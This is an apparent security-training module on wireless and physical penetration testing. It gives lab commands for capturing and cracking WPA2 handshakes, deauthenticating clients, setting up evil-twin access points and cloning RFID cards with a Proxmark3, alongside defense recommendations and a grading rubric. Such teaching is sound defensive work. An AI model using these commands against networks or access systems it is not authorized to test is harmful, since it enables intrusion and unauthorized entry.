# Module 15: Wireless & Physical Security

## Objectives
- Understand wireless network security protocols and attack vectors
- Perform WPA2/WPA3 assessment (lab only)
- Understand RFID/NFC cloning and physical security assessments
- Conduct physical penetration testing fundamentals
- Defend against wireless and physical attacks

---

## 15.1 Wireless Security Fundamentals

Wireless networks introduce attack vectors that don't exist in wired environments — anyone within radio range can attempt to intercept, authenticate, or interfere with traffic.

### Wireless Protocols and Security

| Protocol | Security | Attack Status |
|----------|----------|---------------|
| **WEP** | Broken (RC4-based) | Trivially crackable — obsolete |
| **WPA-PSK (TKIP)** | Weak — TKIP deprecated | Vulnerable to certain attacks |
| **WPA2-PSK (AES-CCMP)** | Strong with strong PSK | Vulnerable to offline PSK cracking, KRACK (patched) |
| **WPA3-SAE** | Strong — replaces PSK with SAE | Newer, fewer attacks known; Dragonblood vulnerabilities (patched in newer implementations) |
| **Enterprise (802.1X/EAP)** | Strong with proper config | Depends on EAP method; EAP-MD5 weak, EAP-TLS strong |

---

## 15.2 WPA2-PSK Assessment

### How WPA2-PSK Works
1. Client attempts to associate with the AP
2. AP sends a challenge (random nonce)
3. Client responds with a hashed value derived from the PSK and the challenge
4. If the response is correct, access is granted

The critical vulnerability: the 4-way handshake can be captured and the PSK cracked offline if the PSK is weak.

### Capture the Handshake

```bash
# Put wireless interface in monitor mode
sudo airmon-ng start wlan0

# Scan for target networks
sudo airodump-ng wlan0mon

# Target a specific AP and capture handshake
sudo airodump-ng -c <channel> --bssid <AP_MAC> -w capture wlan0mon

# Deauthenticate a client to force re-authentication (and handshake capture)
sudo aireplay-ng -0 5 -a <AP_MAC> -c <CLIENT_MAC> wlan0mon

# Or use bettercap/hcxdumptool for more efficient capture
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
```

### Crack the PSK

```bash
# Extract handshake from capture
hcxpcapngtool -o output.hc22000 capture.pcapng

# Crack with hashcat (WPA-PBKDF2-PWK is mode 22000 for modern captures)
hashcat -m 22000 output.hc22000 rockyou.txt

# Or with older format (WPA-PSK = mode 2500)
aircrack-ng -w rockyou.txt capture-01.cap

# With rules for targeted attacks
hashcat -m 22000 output.hc22000 rockyou.txt -r rules/best64.rule
```

### What This Means
- A strong, random PSK (20+ characters, mixed case, digits, symbols) is effectively uncrackable
- A weak PSK (common words, addresses, phone numbers) can be cracked in minutes to hours
- The attack requires being within radio range of the target AP and a client connecting

---

## 15.3 WPA3 and Advanced Attacks

### WPA3 SAE (Simultaneous Authentication of Equals)
WPA3 replaces the PSK exchange with SAE (based on Dragonfly key exchange), which:
- Prevents offline dictionary attacks on the handshake
- Provides forward secrecy
- Is resistant to the classic WPA2 PSK cracking approach

**Known WPA3 attacks (Dragonblood):** Several vulnerabilities were discovered in early WPA3 implementations (CVE-2019-9488, CVE-2019-9489, CVE-2019-9490, CVE-2019-9491, CVE-2019-9494, CVE-2019-9496). Most have been patched. These attacks are largely of historical/educational interest now.

### Enterprise (802.1X) Attacks
- **EAP-MD5:** No server authentication, vulnerable to offline cracking — should never be used
- **EAP-TLS:** Strong mutual authentication with certificates — hardest to attack
- **EAP-PEAP/MSCHAPv2:** Vulnerable to credential harvesting if the server certificate isn't validated
- **EAP-TTLS:** More flexible, can tunnel weaker inner auth methods

**Practical enterprise attacks:**
- Evil twin AP with a rogue RADIUS server — capture credentials if users don't validate certificates
- KRACK (Key Reinstallation Attack) — patched in modern systems but historically significant

---

## 15.4 Rogue AP and Evil Twin Attacks

### Evil Twin Concept
Set up a malicious AP that mimics a legitimate one. When users connect, you can:
- Capture their credentials (if using PEAP/MSCHAPv2 without certificate validation)
- Intercept and modify their traffic (if combined with a DNS spoof or MitM)
- Trick them into connecting (same SSID, stronger signal)

```bash
# Using airbase-ng (older toolset)
sudo airbase-ng -e "TargetNetwork" -c 6 wlan0mon

# Using bettercap for more modern approach
sudo bettercap -eval "set wifi.interface wlan0; wifi.recon on; wifi.ap.ssid TargetNetwork; wifi.ap.corr on; wifi.ap.start"

# Combined with a rogue RADIUS for credential capture
# or with a phishing captive portal
```

**Defense:** Users should validate server certificates when connecting to enterprise Wi-Fi. Strong PIN/password on the legitimate AP prevents easy cloning. Monitoring for rogue APs in the environment.

---

## 15.5 RFID and NFC

### RFID Basics
RFID (Radio Frequency Identification) is used for access cards, payment cards, inventory tracking, etc. Common frequencies:
- **125 kHz (LF):** Older access cards (HID Prox, etc.) — unencrypted, easily cloned
- **13.56 MHz (HF):** Newer smart cards (Mifare, DESFire, etc.) — can be encrypted
- **NFC:** Based on 13.56 MHz HF RFID — used in smartphones, payment cards

### RFID Cloning

```bash
# Using Proxmark3 (common RFID research tool)
# Identify the card type
proxmark3 --> lf search    # For 125 kHz cards
proxmark3 --> hf search    # For 13.56 MHz cards

# Clone a 125 kHz HID Prox card (unencrypted)
proxmark3 --> lf hid clone <card_id>

# For Mifare Classic (weak crypto, can be cracked)
proxmark3 --> hf mf read    # Read the card
proxmark3 --> hf mf crack   # Crack the key
proxmark3 --> hf mf restore  # Clone to another card

# Mifare DESFire: encrypted, harder to clone — requires key or vulnerabilities
```

### NFC Attacks
- **NFC tag spoofing:** Write malicious data to NFC tags
- **Relay attacks:** Extend the range of an NFC transaction by relaying the signal (e.g., car keyless entry, payment cards)
- **NFC payment fraud:** Cloning or relaying payment card data (requires specific hardware)

**Important:** RFID/NFC cloning for unauthorized access is illegal. These techniques should only be practiced in a lab with cards you own or have explicit permission to test.

---

## 15.6 Physical Security Assessment

Physical security is the foundation — if an attacker can physically access a system, most technical controls can be bypassed.

### Physical Attack Vectors

| Vector | Description | Impact |
|--------|-------------|--------|
| **Tailgating/piggybacking** | Following an authorized person through a secure door | Unauthorized physical access |
| **Door lock attacks** | Picking, bumping, drilling, exploiting weak locks | Bypass physical barrier |
| **USB drops** | Leaving infected USB drives in accessible locations | Malware introduction, credential theft |
| **Dumpster diving** | Searching trash for sensitive documents, hardware | Information gathering |
| **Shoulder surfing** | Watching someone enter credentials or sensitive info | Credential or information capture |
| **Impersonation** | Posing as delivery person, IT, contractor | Physical access, social engineering |
| **Hardware keyloggers** | Physical device between keyboard and computer | Credential capture |
| **Lock picking** | Opening locked doors, cabinets, devices | Physical access to secured areas/items |

### Physical Assessment Methodology

1. **Perimeter assessment:** Fences, gates, barriers, lighting, cameras
2. **Entry points:** Doors, windows, loading docks, delivery areas
3. **Access controls:** Locks, badges, biometric scanners, guards, turnstiles
4. **Internal controls:** Secure areas (server rooms, filing cabinets, workstations)
5. **Policy review:** Visitor procedures, clean desk policy, device locking, shredding
6. **Employee awareness:** How do employees react to strangers? Do they hold doors? Do they leave workstations unlocked?

### Physical Penetration Testing (Red Team Context)
Physical penetration testing involves attempting to gain unauthorized physical access to a facility to test defenses. This is highly regulated and requires explicit, detailed authorization.

**Typical scope elements:**
- Which buildings, floors, areas are in scope
- What times are allowed
- What techniques are allowed (lock picking, impersonation, tailgating)
- What to avoid (alarms, certain areas, certain employees)
- Emergency procedures

---

## 15.7 Lab: Wireless & Physical Security

### Setup
- Kali Linux with wireless adapter that supports monitor mode and packet injection
- A wireless router/access point configured for the lab (WPA2-PSK with a known weak password for cracking practice)
- A client device (phone, laptop) that connects to the lab AP
- RFID cards and a Proxmark3 or similar tool (if available) — or simulate conceptually
- Physical security lab: a locked door, locked box, or similar (can use practice lock picking sets)

### Tasks

**Task 1: Wireless Network Reconnaissance**
1. Put your wireless interface in monitor mode:
   ```bash
   sudo airmon-ng start wlan0
   ```
2. Scan for wireless networks:
   ```bash
   sudo airodump-ng wlan0mon
   ```
3. Identify your lab AP:
   - SSID
   - BSSID (MAC address)
   - Channel
   - Encryption type (WPA2, WPA3, etc.)
   - Connected clients (MAC addresses)
4. Document the wireless environment

**Task 2: Capture WPA2 Handshake**
1. Target your lab AP:
   ```bash
   sudo airodump-ng -c <channel> --bssid <AP_MAC> -w labcapture wlan0mon
   ```
2. Force a client to reconnect (to capture the handshake):
   ```bash
   sudo aireplay-ng -0 5 -a <AP_MAC> -c <CLIENT_MAC> wlan0mon
   ```
3. Verify the handshake was captured (look for "WPA handshake: <AP_MAC>" in airodump output)
4. Document the capture process and verify the handshake file

**Task 3: Crack the WPA2 PSK**
1. Convert the capture if needed:
   ```bash
   hcxpcapngtool -o lab.hc22000 labcapture-01.cap
   ```
2. Crack with hashcat or aircrack-ng:
   ```bash
   hashcat -m 22000 lab.hc22000 /usr/share/wordlists/rockyou.txt
   # OR
   aircrack-ng -w /usr/share/wordlists/rockyou.txt labcapture-01.cap
   ```
3. If the password isn't in rockyou.txt, try:
   - A targeted wordlist (based on the lab's context — e.g., the lab name, address, etc.)
   - A mask attack (if you know the password format)
4. Document the cracking process and result

**Task 4: Test a Strong PSK**
1. Change the lab AP's password to a strong, random 20+ character PSK
2. Capture a new handshake
3. Attempt to crack it with a wordlist — it should fail
4. Document the difference between weak and strong PSK security

**Task 5: Evil Twin / Rogue AP (Conceptual/Lab)**
*Note: Only in an isolated lab environment.*
1. Review the concept of an evil twin AP
2. If hardware and lab setup permit:
   - Set up a rogue AP with the same SSID as your lab AP
   - Observe client behavior (do any devices auto-connect?)
   - Document the attack flow and what it would achieve
3. If not possible, document the conceptual attack and detection methods

**Task 6: RFID/NFC (If Hardware Available)**
1. Use Proxmark3 (or similar) to analyze RFID/NFC cards in the lab
2. Identify card types (125 kHz, 13.56 MHz, Mifare, etc.)
3. If using practice cards, attempt cloning of unencrypted cards
4. Document card types found, their security characteristics, and any cloning attempts
5. If no hardware available, research and document RFID/NFC attack techniques and defenses

**Task 7: Physical Security Assessment (Lab)**
1. Assess a physical space (a lab room, office area, or practice setup):
   - Identify entry points and access controls
   - Test locking mechanisms (with permission — use practice locks, not real facility locks)
   - Test clean desk policy (are passwords written down? Are devices locked?)
   - Test workstation locking (do users lock their screens when away?)
2. Document findings:
   - What controls are in place?
   - What weaknesses did you identify?
   - What would an attacker do given these conditions?

**Task 8: Physical Security Defense Recommendations**
1. Based on your assessment, recommend physical security improvements:
   - Access control improvements (stronger locks, badge access, biometrics)
   - Policy improvements (clean desk, screen locking, visitor procedures)
   - Detection improvements (cameras, alarms, guards, rogue AP detection)
   - Employee training (tailgating awareness, social engineering awareness)
2. Prioritize recommendations by risk reduction and feasibility

---

## 15.8 Expected Outcomes

By the end of this module, you should be able to:
- Perform wireless network reconnaissance and capture WPA2 handshakes
- Crack weak WPA2 PSKs and understand why strong PSKs resist cracking
- Understand WPA3 and enterprise wireless security
- Explain evil twin and rogue AP attacks
- Understand RFID/NFC cloning concepts and tools
- Conduct a basic physical security assessment
- Recommend wireless and physical security improvements

---

## 15.9 Assessment Criteria

| Criteria | Points | Description |
|----------|--------|-------------|
| Wireless recon | 5 | Identifies networks, clients, and characteristics |
| Handshake capture | 10 | Successfully captures WPA2 handshake |
| PSK cracking | 10 | Cracks weak PSK; demonstrates why strong PSK resists cracking |
| Evil twin understanding | 5 | Explains evil twin concept and detection |
| RFID/NFC understanding | 5 | Describes RFID types, cloning concepts, defenses |
| Physical assessment | 10 | Conducts and documents a physical security assessment |
| Defense recommendations | 10 | Recommends specific wireless and physical security improvements |
| Report quality | 10 | Professional documentation of methodology, findings |
| **Total** | **65** | |

**Pass threshold:** 45/65 (69%)

### Report Requirements (4-5 pages)
1. Wireless environment overview — networks found, characteristics, clients
2. Handshake capture — methodology, tools, verification
3. PSK cracking — wordlist used, result, time, analysis of weak vs. strong PSK
4. Rogue AP / evil twin — conceptual understanding or lab demonstration
5. RFID/NFC — card types, security characteristics, cloning concepts
6. Physical security assessment — entry points, controls, weaknesses found
7. Defense recommendations — prioritized wireless and physical security improvements
